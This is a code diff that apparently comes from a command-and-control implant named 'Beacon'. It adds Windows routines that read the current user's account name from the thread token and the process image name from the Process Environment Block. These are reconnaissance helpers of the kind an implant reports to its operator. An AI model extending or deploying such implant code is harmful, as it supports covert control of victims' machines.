@@ -53,7 +53,11 @@ DEFINESEC(B) PVOID BeaconUsername( PBEACON_INSTANCE Ins )
 	PTOKEN_USER Usr = 0;
 	HANDLE      Tok = 0;
 	DWORD       Res = 1;
-	PVOID       Str = 0;
+	PVOID       Wdp = 0;
+	PVOID       Wup = 0;
+	ULONG       Typ = 0;
+	ULONG       Wdl = 0;
+	ULONG       Wul = 0;
 	ULONG       Len = 0;
 
 	if ( !Ins->api.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, FALSE, &Tok ) )
@@ -70,7 +74,36 @@ DEFINESEC(B) PVOID BeaconUsername( PBEACON_INSTANCE Ins )
 		{
 			if ( Ins->api.GetTokenInformation( Tok, TokenUser, Usr, Len, &Len ) )
 			{
-				/* Success. Lookup the account SID */
+				if ( ! Ins->api.LookupAccountSidA(
+							NULL,
+							Usr->User.Sid,
+							NULL,
+							&Wul,
+							NULL,
+							&Wdl,
+							( PSID_NAME_USE )&Typ
+							))
+				{
+					if ((Wdp = Ins->api.LocalAlloc( LPTR, Wdl )))
+					{
+						if ((Wup = Ins->api.LocalAlloc( LPTR, Wul )))
+						{
+							if ( Ins->api.LookupAccountSidA(
+										NULL,
+										Usr->User.Sid,
+										Wup,
+										&Wul,
+										Wdp,
+										&Wdl,
+										( PSID_NAME_USE ) &Typ
+										))
+							{
+								Res = 0;
+							};
+						};
+						Ins->api.LocalFree( Wdp );
+					};
+				};
 			};
 			Ins->api.LocalFree( Usr );
 		};
@@ -79,5 +112,37 @@ DEFINESEC(B) PVOID BeaconUsername( PBEACON_INSTANCE Ins )
 	Ins->api.CloseHandle( Tok ); 
 
 	return Res != 1 ? 
-	       Str : Ins->api.LocalFree( Str );
+	       Wup : Ins->api.LocalFree( Wup );
+};
+
+/*-
+ *
+ * BeaconProcess
+ *
+ * Purpose:
+ *
+ * Returns a string containing the 
+ * Beacon process name in ANSI.
+ *
+-*/
+DEFINESEC(B) PVOID BeaconProcess( PBEACON_INSTANCE Ins )
+{
+	PPEB  Peb = 0;
+	PVOID Img = 0;
+	PVOID Str = 0;
+	ULONG Len = 0;
+
+	Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+	Img = Peb->ProcessParameters->ImagePathName.Buffer;
+	Img = CPTR( UPTR( Ins->api.wcsrchr( Img, '\\' ) ) + 1 );
+
+	if ((Str = Ins->api.LocalAlloc( LPTR, Ins->api.wcslen( Img ) + 1 )))
+	{
+		if (( Ins->api.wcstombs( Str, Img, Ins->api.wcslen( Img ) ) ) != -1 )
+		{
+			return Str;
+		};
+		Ins->api.LocalFree( Str );
+	};
+	return NULL;
 };
